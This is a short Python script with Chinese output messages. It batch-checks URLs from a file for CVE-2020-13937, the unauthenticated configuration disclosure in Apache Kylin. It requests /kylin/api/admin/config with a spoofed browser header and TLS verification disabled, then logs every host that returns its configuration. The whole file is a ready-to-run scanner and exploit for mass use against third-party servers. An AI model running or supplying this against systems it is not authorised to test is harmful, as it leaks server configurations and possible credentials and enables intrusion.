import requests

headers = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0"
}

for url in open ("kylin.txt"):
	url = url.replace("\n", "")
	print(url + "正在检测中------")
	try:
		jiaoyan = requests.get(url+"/kylin/api/admin/config", headers=headers, verify=False, timeout=3)
		if ("\"config\":" in jiaoyan.text):
			with open("Apache Kylin config 未授权配置泄露 CVE-2020-13937 vul.txt", "a+") as f:
				print(url+"存在漏洞----->Apache Kylin config 未授权配置泄露 CVE-2020-13937\n")
				f.write(url+"\n")
	except:
		continue
